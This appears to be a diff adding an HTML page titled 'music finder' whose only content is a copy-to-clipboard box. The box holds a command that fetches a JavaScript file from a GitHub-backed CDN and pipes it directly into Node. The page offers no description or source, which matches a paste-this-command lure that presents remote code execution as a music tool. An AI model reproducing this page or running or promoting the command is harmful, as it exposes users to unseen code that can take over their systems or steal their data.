@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>music finder</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #0d1117;
+            font-family: Arial, sans-serif;
+            color: #e6edf3;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 650px;
+        }
+
+        .code-box {
+            position: relative;
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 16px;
+            background: #21262d;
+            border-bottom: 1px solid #30363d;
+            color: #8b949e;
+            font-size: 13px;
+        }
+
+        .copy-btn {
+            background: transparent;
+            border: 1px solid #484f58;
+            color: #c9d1d9;
+            padding: 5px 10px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 12px;
+            transition: 0.2s;
+        }
+
+        .copy-btn:hover {
+            background: #30363d;
+            color: white;
+        }
+
+        pre {
+            margin: 0;
+            padding: 22px;
+            white-space: pre-wrap;
+            overflow-wrap: anywhere;
+            font-family: Consolas, Monaco, monospace;
+            font-size: 14px;
+            line-height: 1.7;
+            color: #e6edf3;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <div class="code-box">
+
+            <div class="header">
+                <button class="copy-btn" onclick="copyText()" id="copyBtn">
+                    Copy
+                </button>
+            </div>
+
+            <pre id="text">curl -sL https://cdn.jsdelivr.net/gh/ltorl/music-finder/index.js | node</pre>
+
+        </div>
+    </div>
+
+    <script>
+        async function copyText() {
+            const text = document.getElementById("text").textContent;
+            const button = document.getElementById("copyBtn");
+
+            try {
+                await navigator.clipboard.writeText(text);
+
+                button.textContent = "✓ Copied!";
+
+                setTimeout(() => {
+                    button.textContent = "Copy";
+                }, 2000);
+
+            } catch (err) {
+                button.textContent = "Copy failed";
+            }
+        }
+    </script>
+
+</body>
+</html>
